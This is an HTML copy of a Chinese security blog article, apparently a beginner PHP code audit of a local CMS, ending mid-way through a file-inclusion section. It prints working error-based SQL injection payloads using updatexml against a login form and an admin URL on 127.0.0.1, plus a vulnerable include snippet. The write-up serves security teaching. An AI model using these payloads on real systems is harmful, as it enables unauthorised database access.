<html>
<head>
<title>代码审计记一次PHP入门代码审计</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
代码审计 | 记一次PHP入门代码审计
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    11ccaab
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2021-07-05</em>
                </div>

                
                                                                                                                                                                                                                        <div id="js_tags"  class="article-tag__list" data-len="3">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                                                                <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1916264558365605895#wechat_redirect" data-tag_id="" data-album_id="1916264558365605895"  data-tag_source="1">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>代码审计</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>2</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1916264558466269191#wechat_redirect" data-tag_id="" data-album_id="1916264558466269191"  data-tag_source="1">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>Web安全</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>2</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1942566025925853186#wechat_redirect" data-tag_id="" data-album_id="1942566025925853186"  data-tag_source="1">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>PHP</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>1</span>
                                                                            </div>
                                                                                    </div>
                                    </div><div id="weixin_content"><p style="margin-right: 8px;margin-bottom: 1.5em;margin-left: 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;" data-mpa-powered-by="yiban.io">#0x01 sql注入</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">###1.1 /admin/files/login.php 先看后台/admin/files/login.php</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/1_OKQKIJvTY4wumnsyqru0G1UKVwYF6Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI8HSic1nrFLpT5AJ9icH88vZlOzOKQKIJvTY4wumnsyqru0G1UKVwYF6Q/640?wx_fmt=png'" data-type="png" data-w="982" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到没有过滤就直接带入查询了而且还写出报错，这里就可以使用报错注入 payload</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">11</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">' and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- +&amp;password=11&amp;login=yes</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.33879781420765026" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/2_HDNOsYp0QY815h3lDvblIFEFHYRMmQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIBt6ibiblasnBZ1mLCiaVaGwStLOHDNOsYp0QY815h3lDvblIFEFHYRMmQ/640?wx_fmt=png'" data-type="png" data-w="732" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">###1.2 /files/submit.php 留言板同理,全都没做过滤</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5786476868327403" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/3_C3QG8wJRRgeTxU2EulQicZH0OyxJsg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIjYWpGibCzHiaNLbzG0gVCuiaxvMyC3QG8wJRRgeTxU2EulQicZH0OyxJsg/640?wx_fmt=png'" data-type="png" data-w="1405" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.28583264291632143" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/4_k2QYIhWL4EiadojGBxVaX08qTPlGVA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIic9K5gnl0f3RaNJszXcd65fWhRk2QYIhWL4EiadojGBxVaX08qTPlGVA/640?wx_fmt=png'" data-type="png" data-w="1207" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">seay可以看到sql语句</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.14604591836734693" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/5_cKrVIprxmSKfrLo438CTKKnaWFuoZw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIeBVU4RlAHk80IdsfuJicT4gjbicKrVIprxmSKfrLo438CTKKnaWFuoZw/640?wx_fmt=png'" data-type="png" data-w="1568" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">###1.3 /files/content.php 然后就是content.php可以看到前面虽然过滤了引号但是后面就没有过滤了</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.44851063829787235" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/6_jwkWcFoMZvXXBbBSzvVAib1IfxTv2w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIHwH94ba0OlM9icQhKt4R4BeKNyjwkWcFoMZvXXBbBSzvVAib1IfxTv2w/640?wx_fmt=png'" data-type="png" data-w="1175" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.22111111111111112" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/7_S1XicibBzx7Db1htPYcy3TDGmiaN3w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI7APfW9GHB2PhjTbjb9NIAtKHw7rS1XicibBzx7Db1htPYcy3TDGmiaN3w/640?wx_fmt=png'" data-type="png" data-w="900" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">###1.4 /admin/files/editcolumn.php</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4364406779661017" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/8_icmuyhISctGm3AwGia1SZvL99JZzYA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI4ky8Cy0Zxzon0zHqTpAvFLCSXqicmuyhISctGm3AwGia1SZvL99JZzYA/640?wx_fmt=png'" data-type="png" data-w="708" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">其他的就不多说了 payload</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">http</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//127.0.0.1/cms/xhcms/admin/?r=editcolumn&amp;type=1&amp;id=1%27%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))%20--+</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.1807511737089202" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/9_h0Ca5ZYXxH4lwGCDmGZicBDPTDVafg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIKBLOvStalPRVHOrBbj4ShU7yDh0Ca5ZYXxH4lwGCDmGZicBDPTDVafg/640?wx_fmt=png'" data-type="png" data-w="852" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">#0x02 文件包含 ###2.1 文件包含小tips 相关包含函数 require() require_once() include() include_once() 漏洞产生原因 可控变量，漏洞函数 ###2.1.1本地文件包含</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&lt;?</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">php</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$filename </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $_GET</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'filename'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">];</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: 